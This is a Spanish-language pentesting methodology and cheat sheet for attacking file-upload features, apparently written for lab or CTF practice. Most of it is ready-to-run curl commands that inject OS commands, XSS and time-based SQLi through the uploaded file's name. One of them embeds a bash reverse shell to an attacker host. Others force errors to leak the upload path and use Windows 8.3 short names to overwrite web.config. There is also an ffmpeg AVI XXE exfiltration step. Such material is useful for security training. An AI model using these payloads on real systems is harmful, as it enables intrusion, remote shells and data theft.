---
tags:
  - webapp
  - fileupload
---
## Conceptos Clave (TL;DR)

- Los ataques de subida de archivos van mas allá del bypass de extensión: el nombre del archivo en si puede ser un vector de inyección (OS command, XSS, SQLi) si la aplicación lo procesa o refleja sin sanitizar.
- La divulgación del directorio de uploads es critica para ejecutar payloads; puede obtenerse por fuzzing, LFI/XXE, errores forzados (nombre duplicado, nombre excesivamente largo) o IDOR.
- En entornos Windows existen vectores específicos: caracteres reservados del OS, nombres de dispositivo reservados (CON, NUL, COM1) y la convención de nombres cortos 8.3 (~) que permite sobrescribir archivos existentes.
- Cualquier procesamiento automático post-upload (encoding, compresión, renombrado) puede esconder vulnerabilidades en librerías de terceros (ej. XXE via ffmpeg con archivos AVI).


## Herramientas Clave

- **ffmpeg** - Procesador multimedia; versiones vulnerables permiten XXE a traves de archivos AVI maliciosos subidos.
- **Burp Suite / ffuf / gobuster** - Fuzzing del directorio de uploads cuando la URL no se expone en la UI.
- **curl / Burp Repeater** - Envio de solicitudes duplicadas simultaneas para forzar errores del servidor que revelen la ruta.
- **Modulo LFI / XXE** - Lectura del codigo fuente de la aplicacion para localizar la ruta de uploads configurada.


## Metodologia Paso a Paso

### Fase 1: Reconocimiento del comportamiento del upload

Antes de atacar, determinar:
1. El nombre del archivo subido, se refleja en la pagina, en logs, en emails, o en algun endpoint?
2. La aplicación devuelve la URL del archivo subido?
3. Que procesamiento automático ocurre post-upload? (miniaturas, compresión, renombrado)

Si el nombre se refleja -> probar inyecciones en el nombre (Fase 2).
Si la URL no se expone -> descubrir el directorio (Fase 3).
Si hay procesamiento automatico -> investigar CVEs de la libreria usada (Fase 5).

### Fase 2: Inyecciones en el nombre del archivo

La aplicacion puede pasar el nombre del archivo a una funcion del OS (mv, cp), a una query SQL, o renderizarlo en HTML sin sanitizar.

1. Probar inyeccion de comando OS en el nombre del archivo.
2. Probar payload XSS en el nombre del archivo.
3. Probar inyeccion SQL en el nombre del archivo.
4. Subir el archivo y observar la respuesta / comportamiento de la aplicacion.

### Fase 3: Descubrimiento del directorio de uploads

Cuando la URL del archivo no se expone:
1. Fuzzear rutas comunes de uploads con un wordlist.
2. Explotar LFI o XXE para leer archivos de configuracion del servidor web que contengan la ruta.
3. Forzar errores del servidor subiendo un archivo con nombre ya existente o con nombre de mas de 5000 caracteres -> el error suele revelar la ruta absoluta.
4. Revisar si hay referencias IDOR en la respuesta que apunten al archivo.

### Fase 4: Ataques especificos de Windows

Solo aplica si el backend corre sobre Windows.
1. Usar caracteres reservados del shell en el nombre para provocar error con ruta en el mensaje.
2. Usar nombres de dispositivos reservados del OS para provocar error de escritura.
3. Usar la convencion 8.3 para apuntar o sobrescribir archivos de configuracion sensibles.

### Fase 5: Ataques en procesamiento automatico

1. Identificar que libreria o herramienta procesa el archivo subido (cabeceras, comportamiento, mensajes de error).
2. Buscar CVEs publicos para esa libreria (ej. ffmpeg AVI -> XXE).
3. Generar el archivo malicioso segun el PoC del CVE y subirlo.
4. Verificar el impacto: exfiltracion de archivos, SSRF, RCE, DoS.


## Cheat Sheet de Comandos

### Inyeccion de comando OS en nombre de archivo

```bash
# Sintaxis $(cmd): el shell ejecuta 'whoami' al procesar el nombre
mv_payload='file$(whoami).jpg'

# Sintaxis backticks: equivalente a $()
mv_payload='file`whoami`.jpg'

# Sintaxis pipe: encadena comandos si el nombre no va entre comillas
mv_payload='file.jpg||whoami'

# Subir el archivo con el nombre malicioso via curl
# -F envia multipart/form-data; filename= define el nombre en el servidor
curl -s -X POST "http://<TARGET_IP>/upload" \
  -F "file=@shell.jpg;filename=file\$(whoami).jpg"
```

```bash
# Inyeccion con reverse shell en el nombre (si el contexto lo permite)
# Encerrar el comando completo en $() dentro del nombre
curl -s -X POST "http://<TARGET_IP>/upload" \
  -F "file=@shell.jpg;filename=file\$(bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1).jpg"
```

### Payload XSS en nombre de archivo

```bash
# El nombre del archivo se renderiza en HTML -> XSS reflejado o almacenado
# Util si un admin/usuario ve el nombre en un panel
curl -s -X POST "http://<TARGET_IP>/upload" \
  -F "file=@test.jpg;filename=<script>alert(window.origin);</script>.jpg"
```

### Payload SQLi en nombre de archivo

```bash
# El nombre se inserta en una query SQL sin parametrizar
# sleep(5) confirma inyeccion ciega por tiempo
curl -s -X POST "http://<TARGET_IP>/upload" \
  -F "file=@test.jpg;filename=file';select+sleep(5);--.jpg"
```

### Forzar error para revelar directorio de uploads

```bash
# Metodo 1: subir dos veces el mismo archivo (nombre duplicado)
# La segunda peticion deberia provocar error de escritura con la ruta
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=test.jpg"
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=test.jpg"
```

```bash
# Metodo 2: nombre excesivamente largo (5000 caracteres)
# python3 genera la cadena; el servidor falla al intentar escribir la ruta completa
python3 -c "print('A'*5000 + '.jpg')" | xargs -I{} curl -s -X POST \
  "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename={}"

# Alternativa manual con variable de bash
LONG_NAME=$(python3 -c "print('A'*5000)")
curl -s -X POST "http://<TARGET_IP>/upload" \
  -F "file=@test.jpg;filename=${LONG_NAME}.jpg"
```

```bash
# Metodo 3: fuzzing del directorio de uploads con ffuf
# -w wordlist de rutas comunes; -u URL con FUZZ como placeholder
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -u "http://<TARGET_IP>/FUZZ" \
  -mc 200,301,302,403 \
  -t 50
```

```bash
# Metodo 4: fuzzing con gobuster
gobuster dir -u "http://<TARGET_IP>/" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 30 -x php,txt,html
```

### Ataques Windows: caracteres y nombres reservados

```powershell
# Nombres de dispositivos reservados de Windows que no pueden crearse como archivos
# El servidor retornara un error al intentar escribir el archivo
# Enviar via curl desde el atacante Linux:
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=CON.jpg"
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=NUL.jpg"
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=COM1.jpg"
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=LPT1.jpg"
```

```bash
# Caracteres reservados del shell de Windows en el nombre
# Pueden referenciar otro archivo o provocar error que revele la ruta
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=file|test.jpg"
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=file<test.jpg"
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@test.jpg;filename=file>test.jpg"
```

```bash
# Convencion de nombres cortos Windows 8.3 para sobrescribir archivos existentes
# HAC~1.TXT referencia el primer archivo cuyo nombre empiece por HAC
# WEB~1.CON intenta sobrescribir web.config (archivo de configuracion IIS)
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@malicious.config;filename=WEB~1.CON"

# Referencia a un archivo existente conocido para forzar sobreescritura
curl -s -X POST "http://<TARGET_IP>/upload" -F "file=@payload.txt;filename=HAC~1.TXT"
```

### Ataque ffmpeg AVI -> XXE (CVE especifico de libreria)

```bash
# Generar un archivo AVI malicioso con payload XXE embebido
# El payload lee /etc/passwd del servidor via XXE al ser procesado por ffmpeg
cat > malicious.avi << 'EOF'
ID3...
[insertar PoC segun CVE aplicable; buscar en exploit-db o github]
EOF

# Subir el archivo AVI al endpoint de procesamiento de video
curl -s -X POST "http://<TARGET_IP>/upload/video" \
  -F "file=@malicious.avi;filename=video.avi"

# Monitorear el servidor de exfiltracion para recibir el contenido del archivo leido
# Levantar un servidor HTTP simple en la maquina atacante
python3 -m http.server <ATTACKER_PORT>
```


## "Gotchas" y Troubleshooting

- **Nombre reflejado vs procesado**: que el nombre aparezca en la UI no implica inyeccion OS; verificar si tambien se usa en una llamada del sistema. Leer el codigo fuente (si es posible via LFI) para confirmar.
- **Encoding del nombre en multipart**: algunos frameworks sanitizan el filename del header Content-Disposition antes de pasarlo al OS. Si curl no funciona, modificar directamente en Burp Suite para evitar encoding automatico del cliente.
- **Caracteres especiales en curl**: los caracteres como `$`, `;`, `|`, `<`, `>` requieren escaping o comillas simples en bash al pasarlos como argumento de curl. Usar Burp Repeater si hay problemas con el escaping.
- **Convencion 8.3 solo en NTFS/FAT**: el ataque de nombre corto solo aplica en servidores Windows con sistema de archivos NTFS o FAT. En ReFS o Linux no tiene efecto.
- **Nombres reservados y extensiones**: CON.jpg puede no triggear el error en todos los servidores; probar CON sin extension y con distintas extensiones.
- **Procesamiento asincrono**: si el archivo es procesado por una cola (worker, job), el error o el efecto del payload puede tardar segundos o minutos. Monitorear el servidor de exfiltracion durante al menos 60 segundos.
- **ffmpeg XXE**: la vulnerabilidad depende de la version exacta de ffmpeg; verificar la version del servidor antes de intentar el exploit (cabeceras de respuesta, paginas de error, archivos expuestos).
- **Descubrimiento de ruta via LFI**: si existe LFI, leer `/etc/apache2/sites-enabled/000-default.conf`, `/etc/nginx/nginx.conf` o el `web.config` de IIS para encontrar el DocumentRoot y los directorios de uploads configurados.
- **Solicitudes simultaneas para error de duplicado**: usar herramientas como `intruder` en Burp con modo "Pitchfork" o un script python con `threading` para garantizar que las dos peticiones lleguen al mismo tiempo; si se envian secuencialmente, el primer archivo puede sobreescribirse sin error.